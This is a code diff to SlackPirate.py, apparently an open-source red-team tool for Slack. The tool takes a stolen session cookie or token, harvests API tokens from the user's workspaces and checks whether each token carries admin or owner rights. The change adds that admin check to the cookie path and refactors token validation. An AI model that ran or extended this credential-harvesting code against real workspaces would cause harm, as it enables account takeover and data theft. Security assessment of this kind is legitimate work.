@@ -141,7 +141,7 @@ def is_rate_limited(slack_api_json_response):
         return False
 
 
-def display_cookie_tokens(cookie):
+def display_cookie_tokens(cookie, user_agent):
     """
     If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
     then RegEx out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then
@@ -158,7 +158,11 @@ def display_cookie_tokens(cookie):
                 r = requests.get(workspace, cookies=cookie)
                 regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
                 for slack_token in regex_tokens:
-                    print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "white", "on_green"))
+                    collected_output_info = init_scanning_context(token=slack_token, user_agent=user_agent)
+                    if check_if_admin_token(token=slack_token, output_info=collected_output_info):
+                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (admin token!)', "white", "on_magenta"))
+                    else:
+                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (not admin)', "white", "on_green"))
         else:
             print(termcolor.colored("No workspaces were found for this cookie", "white", "on_red"))
             exit()
@@ -167,46 +171,54 @@ def display_cookie_tokens(cookie):
     exit()
 
 
-def check_token_validity(token, user_agent: str) -> ScanningContext:
+def init_scanning_context(token, user_agent: str) -> ScanningContext:
     """
-    Use the Slack auth.test API to check whether the token is valid or not. If token is valid then create a
-    directory for results to go in - easy peasy.
+    Initialize the Scanning Context which is used for all the scans.
     """
     result = None
 
     try:
-        r = requests.post("https://slack.com/api/auth.test", params=dict(token=token, pretty=1),
-                          headers={'Authorization': 'Bearer ' + token}).json()
+        r = requests.post("https://slack.com/api/auth.test", params=dict(pretty=1),
+                          headers={'Authorization': 'Bearer ' + token, 'User-Agent': user_agent}).json()
         if str(r['ok']) == 'True':
             result = ScanningContext(output_directory=str(r['team']) + '_' + time.strftime("%Y%m%d-%H%M%S"),
                                      slack_workspace=str(r['url']), user_id=str(r['user_id']), user_agent=user_agent)
-            print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']),
-                                    "white", "on_blue"))
-            print(termcolor.colored("\n"))
-            pathlib.Path(result.output_directory).mkdir(parents=True, exist_ok=True)
         else:
             print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "white", "on_red"))
-            print(termcolor.colored("You can get a token here: https://api.slack.com/custom-integrations/legacy-tokens",
-                                    "white", "on_red"))
             exit()
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
     return result
 
 
+def check_token_validity(token, user_agent: str):
+    """
+    Use the Slack auth.test API to check whether the token is valid or not.
+    """
+
+    try:
+        r = requests.post("https://slack.com/api/auth.test", params=dict(token=token, pretty=1),
+                          headers={'Authorization': 'Bearer ' + token, 'User-Agent': user_agent}).json()
+        if str(r['ok']) == 'True':
+            print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']),
+                                    "white", "on_blue"))
+            print(termcolor.colored("\n"))
+        else:
+            print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "white", "on_red"))
+            exit()
+    except requests.exceptions.RequestException as exception:
+        print(termcolor.colored(exception, "white", "on_red"))
+
+
 def check_if_admin_token(token, output_info: ScanningContext):
     """
-    Checks to see if the token provided is an admin, owner, or primary_owner. If it is, print a message to stdout
+    Checks to see if the token provided is an admin, owner, or primary_owner.
     """
 
     try:
         r = requests.get("https://slack.com/api/users.info", params=dict(
-            token=token, pretty=1, user=output_info.user_id, headers={'User-Agent': output_info.user_agent})).json()
-        if r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']:
-            print(termcolor.colored("BINGO: You seem to be in possession of an admin token!", "white", "on_magenta"))
-            print(termcolor.colored("\n"))
-        else:
-            return
+            token=token, pretty=1, user=output_info.user_id), headers={'User-Agent': output_info.user_agent}).json()
+        return r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
 
@@ -670,7 +682,7 @@ if __name__ == '__main__':
     parser.add_argument('--no-file-download', dest='file_download', action='store_false',
                         help='disable downloading of files from the Workspace')
     parser.add_argument('--version', action='version',
-                        version='SlackPirate.py v0.8. Developed by Mikail Tunç (@emtunc) with contributions from '
+                        version='SlackPirate.py v0.9. Developed by Mikail Tunç (@emtunc) with contributions from '
                                 'the amazing community! https://github.com/emtunc/SlackPirate/graphs/contributors')
     """
     Even with "argument_default=None" in the constructor, all flags were False, so we explicitly set every flag to None
@@ -689,12 +701,16 @@ if __name__ == '__main__':
         print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "white", "on_red"))
         exit()
     elif args.cookie:  # Providing a cookie leads to a shorter execution path
-        display_cookie_tokens(cookie=dict(d=args.cookie))
+        display_cookie_tokens(cookie=dict(d=args.cookie), user_agent=selected_agent)
         exit()
     # Baseline behavior
     provided_token = args.token
-    collected_output_info = check_token_validity(token=provided_token, user_agent=selected_agent)
-    check_if_admin_token(token=provided_token, output_info=collected_output_info)
+    collected_output_info = init_scanning_context(token=provided_token, user_agent=selected_agent)
+    pathlib.Path(collected_output_info.output_directory).mkdir(parents=True, exist_ok=True)
+    check_token_validity(token=provided_token, user_agent=selected_agent)
+    if check_if_admin_token(token=provided_token, output_info=collected_output_info):
+        print(termcolor.colored("BINGO: You seem to be in possession of an admin token!", "white", "on_magenta"))
+        print(termcolor.colored("\n"))
     print_interesting_information(output_info=collected_output_info)
 
     # Possible scans to run along with their flags
